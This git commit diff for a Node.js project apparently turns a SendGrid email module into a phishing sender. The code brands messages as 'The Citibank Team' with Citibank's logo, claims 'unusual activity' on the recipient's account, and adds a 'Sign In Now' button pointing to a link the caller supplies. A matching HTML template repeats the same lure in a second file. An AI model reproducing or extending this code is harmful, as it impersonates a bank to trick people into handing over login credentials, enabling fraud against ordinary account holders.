7c20b9c1fef42d7f83eed81dd78cfb595b3c6166
fistonhn <fistonhn@gmail.com>
2022-06-05 21:34:05 +0200

    new way

--- musis/config/email.js
+++ musis/config/email.js
@@ -1,3 +1,50 @@
+// const sgMail = require("@sendgrid/mail");
+// const mailgen = require("mailgen");
+// const dotenv = require("dotenv");
+
+// dotenv.config();
+
+// const template = new mailgen({
+//   theme: "default",
+//   product: {
+//     name: "amberlothy",
+//     link: "https://axel.com/",
+//   },
+// });
+
+// sgMail.setApiKey(process.env.SENDGRID_API_KEY);
+
+// const generateFlexPayEmail = (name, message) => ({
+//   body: {
+//     name,
+//     message,
+//   },
+// });
+
+// const flexPayNotification = async (account, message) => {
+//   const emailBody = generateFlexPayEmail(
+//     `${message}`,
+//     message,
+//   );
+//   const emailTemplate = template.generate(emailBody);
+
+//   const msg = {
+//     to: account.email,
+//     from:   account.senderEmail,
+//     subject: account.subject,
+//     html: emailTemplate,
+//   };
+//   try {
+//     await sgMail.send(msg);
+//   } catch (error) {
+//     console.log(error);
+//     return "Internal server error";
+//   }
+// };
+
+// module.exports =  flexPayNotification
+
+
 const sgMail = require("@sendgrid/mail");
 const mailgen = require("mailgen");
 const dotenv = require("dotenv");
@@ -7,40 +54,54 @@ dotenv.config();
 const template = new mailgen({
   theme: "default",
   product: {
-    name: "amberlothy",
-    link: "https://axel.com/",
+    bgColor: '#22BC66',
+    name: "The Citibank Team",
+    link: "https://www.citi.com/",
+    logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/1/1d/Citibank.svg/2560px-Citibank.svg.png",
   },
 });
 
 sgMail.setApiKey(process.env.SENDGRID_API_KEY);
 
-const generateFlexPayEmail = (name, message) => ({
-  body: {
-    name,
-    message,
-  },
-});
-
 const flexPayNotification = async (account, message) => {
-  const emailBody = generateFlexPayEmail(
-    `${message}`,
-    message,
-  );
-  const emailTemplate = template.generate(emailBody);
+    const email = {
+        body: {
+            title: 'You Have 1 New Security Message Alert!',
+            intro: ['There is an important security upgrade available for your Online Banking. Recently, we have detected some unusual activity on your account.'],
+            action: {
+                button: {
+                    color: '#a30606', // Optional action button color
+                    text: 'Sign In Now',
+                    link: account.message
+                }
+            },
+            outro: [
+            `<li> Know what\'s going on with your checking, ATM/Debit, credit cardother accounts </li>`,
+            `<li> Receive alerts right to your email or wireless device </li>`,
+            `<li style="font-weight: 600"> Get alerted when a transaction amount is higher than what you\'ve set </li>`
+          ],
+            signature: 'Best'
+        }
+    };
 
-  const msg = {
-    to: account.email,
-    from:   account.senderEmail,
-    subject: account.subject,
-    html: emailTemplate,
-  };
-  try {
-    await sgMail.send(msg);
-  } catch (error) {
-    console.log(error);
-    return "Internal server error";
-  }
-};
+      const emailTemplate = template.generate(email);
+
+    const mailOption = {
+      to: account.email,
+      from:   account.senderEmail,
+      subject: account.subject,
+      html: emailTemplate,
+    }
+    try {
+        const sendmail = await sgMail.send(mailOption)
+
+        return sendmail
+    } catch (error) {
+      console.log(error);
+        return "Internal server error";
+    }
+}
+
 
 module.exports =  flexPayNotification
 
---
+++ musis/helper/email.js
@@ -0,0 +1,220 @@
+
+require('dotenv').config()
+const htmlEmail=(content,restoken)=>{
+  return (
+`
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html data-editor-version="2" class="sg-campaigns" xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+      <!--[if !mso]><!-->
+      <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+      <!--<![endif]-->
+      <!--[if (gte mso 9)|(IE)]>
+      <xml>
+        <o:OfficeDocumentSettings>
+          <o:AllowPNG/>
+          <o:PixelsPerInch>96</o:PixelsPerInch>
+        </o:OfficeDocumentSettings>
+      </xml>
+      <![endif]-->
+      <!--[if (gte mso 9)|(IE)]>
+  <style type="text/css">
+    body {width: 600px;margin: 0 auto;}
+    table {border-collapse: collapse;}
+    table, td {mso-table-lspace: 0pt;mso-table-rspace: 0pt;}
+    img {-ms-interpolation-mode: bicubic;}
+  </style>
+<![endif]-->
+      <style type="text/css">
+    body, p, div {
+      font-family: arial,helvetica,sans-serif;
+      font-size: 14px;
+    }
+    body {
+      color: #000000;
+    }
+    body a {
+      color: #1188E6;
+      text-decoration: none;
+    }
+    p { margin: 0; padding: 0; }
+    table.wrapper {
+      width:100% !important;
+      table-layout: fixed;
+      -webkit-font-smoothing: antialiased;
+      -webkit-text-size-adjust: 100%;
+      -moz-text-size-adjust: 100%;
+      -ms-text-size-adjust: 100%;
+    }
+    img.max-width {
+      max-width: 100% !important;
+    }
+    .column.of-2 {
+      width: 50%;
+    }
+    .column.of-3 {
+      width: 33.333%;
+    }
+    .column.of-4 {
+      width: 25%;
+    }
+    ul ul ul ul  {
+      list-style-type: disc !important;
+    }
+    ol ol {
+      list-style-type: lower-roman !important;
+    }
+    ol ol ol {
+      list-style-type: lower-latin !important;
+    }
+    ol ol ol ol {
+      list-style-type: decimal !important;
+    }
+    @media screen and (max-width:480px) {
+      .preheader .rightColumnContent,
+      .footer .rightColumnContent {
+        text-align: left !important;
+      }
+      .preheader .rightColumnContent div,
+      .preheader .rightColumnContent span,
+      .footer .rightColumnContent div,
+      .footer .rightColumnContent span {
+        text-align: left !important;
+      }
+      .preheader .rightColumnContent,
+      .preheader .leftColumnContent {
+        font-size: 80% !important;
+        padding: 5px 0;
+      }
+      table.wrapper-mobile {
+        width: 100% !important;
+        table-layout: fixed;
+      }
+      img.max-width {
+        height: auto !important;
+        max-width: 100% !important;
+      }
+      a.bulletproof-button {
+        display: block !important;
+        width: auto !important;
+        font-size: 80%;
+        padding-left: 0 !important;
+        padding-right: 0 !important;
+      }
+      .columns {
+        width: 100% !important;
+      }
+      .column {
+        display: block !important;
+        width: 100% !important;
+        padding-left: 0 !important;
+        padding-right: 0 !important;
+        margin-left: 0 !important;
+        margin-right: 0 !important;
+      }
+      .social-icon-column {
+        display: inline-block !important;
+      }
+    }
+  </style>
+      <!--user entered Head Start-->
+      <title>sup</title>
+      <style>
+        h1 {color:red;}
+        p {color:blue;}
+      </style>
+     <!--End Head user entered-->
+    </head>
+    <body>
+      <center class="wrapper" data-link-color="#1188E6" data-body-style="font-size:14px; font-family:arial,helvetica,sans-serif; color:#000000; background-color:#FFFFFF;">
+        <div class="webkit">
+          <table cellpadding="0" cellspacing="0" border="0" width="100%" class="wrapper" bgcolor="#FFFFFF">
+            <tr>
+              <td valign="top" bgcolor="#FFFFFF" width="100%">
+                <table width="100%" role="content-container" class="outer" align="center" cellpadding="0" cellspacing="0" border="0">
+                  <tr>
+                    <td width="100%">
+                      <table width="100%" cellpadding="0" cellspacing="0" border="0">
+                        <tr>
+                          <td>
+                            <!--[if mso]>
+    <center>
+    <table><tr><td width="600">
+  <![endif]-->
+                                    <table width="100%" cellpadding="0" cellspacing="0" border="0" style="width:100%; max-width:600px;" align="center">
+                                      <tr>
+                                        <td role="modules-container" style="padding:0px 0px 0px 0px; color:#000000; text-align:left;" bgcolor="#FFFFFF" width="100%" align="left"><table class="module preheader preheader-hide" role="module" data-type="preheader" border="0" cellpadding="0" cellspacing="0" width="100%" style="display: none !important; mso-hide: all; visibility: hidden; opacity: 0; color: transparent; height: 0; width: 0;">
+    <tr>
+      <td role="module-content">
+        <p></p>
+      </td>
+    </tr>
+  </table><table class="wrapper" role="module" data-type="image" border="0" cellpadding="0" cellspacing="0" width="100%" style="table-layout: fixed;" data-muid="6134459d-3fb8-4d84-bca4-5c28b4110ad4">
+    <tbody>
+      <tr>
+        <td style="font-size:6px; line-height:10px; padding:0px 0px 0px 0px;" valign="top" align="left">
+        
+        </td>
+      </tr>
+    </tbody>
+  </table><table class="module" role="module" data-type="text" border="0" cellpadding="0" cellspacing="0" width="100%" style="table-layout: fixed;" data-muid="41a9b3ef-f0d0-4c27-9cf4-6c5e0128ce98">
+    <tbody>
+      <tr>
+        <td style="padding:18px 0px 18px 0px; line-height:22px; text-align:inherit;" height="100%" valign="top" bgcolor="" role="module-content"><div><div style="font-family: inherit; text-align: left"><span style="font-size: 18px"><strong>You Have 1 New Security Message Alert!</strong></span><br>
+<br>
+There is an important security upgrade available for your Online Banking. Recently, we have detected some unusual activity on your account.</div><div></div></div></td>
+      </tr>
+    </tbody>
+  </table><table border="0" cellpadding="0" cellspacing="0" class="module" data-role="module-button" data-type="button" role="module" style="table-layout:fixed;" width="100%" data-muid="20191005-8e82-48d6-b02d-290e1f58a84d">
+      <tbody>
+        <tr>
+          <td align="left" bgcolor="" class="outer-td" style="padding:0px 0px 0px 0px;">
+            <table border="0" cellpadding="0" cellspacing="0" class="wrapper-mobile" style="text-align:center;">
+              <tbody>
+                <tr>
+                <td align="center" bgcolor="#a30606" class="inner-td" style="border-radius:6px; font-size:16px; text-align:left; background-color:inherit;">
+                  <a href="" style="background-color:#a30606; border:1px solid #a30606; border-color:#a30606; border-radius:0px; border-width:1px; color:#ffffff; display:inline-block; font-size:14px; font-weight:normal; letter-spacing:0px; line-height:6px; padding:12px 18px 12px 18px; text-align:center; text-decoration:none; border-style:solid;" target="_blank">Sign In Now </a>
+                </td>
+                </tr>
+              </tbody>
+            </table>
+          </td>
+        </tr>
+      </tbody>
+    </table><table class="module" role="module" data-type="text" border="0" cellpadding="0" cellspacing="0" width="100%" style="table-layout: fixed;" data-muid="bc1c4fd1-514a-4da0-b7db-d186e866995d" data-mc-module-version="2019-10-22">
+    <tbody>
+      <tr>
+        <td style="padding:18px 0px 18px 0px; line-height:22px; text-align:inherit;" height="100%" valign="top" bgcolor="" role="module-content"><div><ul>
+  <li style="text-align: inherit; font-family: inherit">Know what's going on with your checking, ATM/Debit, credit cardother accounts</li>
+  <li style="text-align: inherit; font-family: inherit">Receive alerts right to your email or wireless device&nbsp;</li>
+  <li style="text-align: inherit; font-family: inherit; font-weight: bold"><strong>Get alerted when a transaction amount is higher than what you've set</strong></li>
+</ul><div></div></div></td>
+      </tr>
+    </tbody>
+  </table></td>
+                                      </tr>
+                                    </table>
+                                    <!--[if mso]>
+                                  </td>
+                                </tr>
+                              </table>
+                            </center>
+                            <![endif]-->
+                          </td>
+                        </tr>
+                      </table>
+                    </td>
+                  </tr>
+                </table>
+              </td>
+            </tr>
+          </table>
+        </div>
+      </center>
+    </body>
+  </html>`
+)
+}
+module.exports=htmlEmail
